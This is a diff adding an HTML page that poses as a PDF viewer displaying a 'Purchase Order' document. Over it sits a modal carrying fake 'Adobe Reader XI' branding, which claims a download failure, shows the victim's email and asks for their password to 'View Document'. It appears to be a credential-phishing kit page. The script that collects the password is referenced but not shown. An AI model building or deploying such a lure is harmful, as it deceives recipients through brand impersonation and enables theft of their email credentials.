@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>PDF Viewer</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div class="pdf-viewer">
+        <div class="toolbar">
+            <div class="toolbar-left">
+                <button class="menu-btn">☰</button>
+                <span class="filename">Purchase Order.pdf</span>
+            </div>
+            <div class="toolbar-center">
+                <span class="page-info">1 / 10</span>
+                <button class="zoom-out">−</button>
+                <span class="zoom-level">100%</span>
+                <button class="zoom-in">+</button>
+                <button class="fit-page">⛶</button>
+                <button class="rotate">↻</button>
+            </div>
+            <div class="toolbar-right">
+                <button class="download">↓</button>
+                <button class="print">🖨</button>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="sidebar">
+                <div class="thumbnail active">
+                    <div class="thumb-content">
+                        <div class="thumb-title">Purchase Order</div>
+                        <div class="thumb-text">Items listed should be submitted on or before the week ends.</div>
+                        <div class="thumb-list">
+                            <div>Items:</div>
+                            <div>• Item details here</div>
+                            <div>• Another item</div>
+                            <div>• More content</div>
+                        </div>
+                    </div>
+                    <div class="page-number">1</div>
+                </div>
+                <div class="thumbnail">
+                    <div class="thumb-content small-text">
+                        <div>Marketplace</div>
+                        <div>Clothing</div>
+                        <div>Discount Rangers</div>
+                        <div>Lingerie Boutique</div>
+                        <div>Vintage</div>
+                        <div>Jersey Internet Line</div>
+                        <div>Superstore</div>
+                    </div>
+                    <div class="page-number">2</div>
+                </div>
+                <div class="thumbnail">
+                    <div class="thumb-content small-text">
+                        <div>Tableware</div>
+                        <div>Kitchenware</div>
+                        <div>Glassware & Cutlery</div>
+                        <div>Counter Supply</div>
+                        <div>Tea Servet Packets</div>
+                    </div>
+                    <div class="page-number">3</div>
+                </div>
+            </div>
+
+            <div class="document-area">
+                <div class="document-page">
+                    <h1 class="doc-title">Purchase Order</h1>
+                    <p class="doc-subtitle">Items listed should be submitted on or before the week ends.</p>
+                    <p class="doc-text">Pay special attention to items listed in <span class="red-text">RED.</span></p>
+                    <p class="doc-text"><strong>PO Number:</strong> [PO 5676-2024]</p>
+                    <p class="doc-text"><strong>Date:</strong> [-]</p>
+                    <p class="doc-text">Kindly apply discounts where applicable.</p>
+                    <p class="doc-text"><strong>Payment Terms</strong></p>
+                    <p class="doc-text"><strong>Payment Method:</strong> [Payment Method]</p>
+                    <p class="doc-text"><strong>Payment Terms:</strong> [Net 30/Net 60/COD, etc.]</p>
+                    <p class="doc-text">See below for items required/order details.</p>
+                    <p class="doc-text"><strong>Order Details</strong></p>
+                    <p class="doc-text"><strong>Item # Description Quantity Unit Price Total Price</strong></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for password login -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <div class="modal-header">
+                <svg class="adobe-icon" viewBox="0 0 24 24" fill="white">
+                    <path d="M13.8 2.5L8 22h3.6l1.4-4.5h5.5l1.4 4.5H24L18.2 2.5h-4.4zm-.3 11.5l1.8-6 1.8 6h-3.6zM0 2.5v19h6.5l1-3.5H3.5V6h10v2.5h3.5V2.5H0z"/>
+                </svg>
+                <span class="header-text">Adobe Reader XI</span>
+                <div class="adobe-logo">
+                    <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="30" height="30" fill="#E41E26" rx="2"></rect>
+                        <image href="https://logodix.com/logo/80058.jpg" x="0" y="0" width="30" height="30"/>
+                    </svg>
+                </div>
+            </div>
+            <div class="modal-body">
+                <p class="error-message">Download failed due to network connection error</p>
+                <p class="email-display" id="emailDisplay"></p>
+                <p class="signin-text">Enter your password to continue</p>
+                <input type="password" class="password-input" placeholder="Password" id="passwordInput" />
+                <button class="view-document-btn">View Document</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Your existing script -->
+    <script src="script.js"></script>
+</body>
+</html>
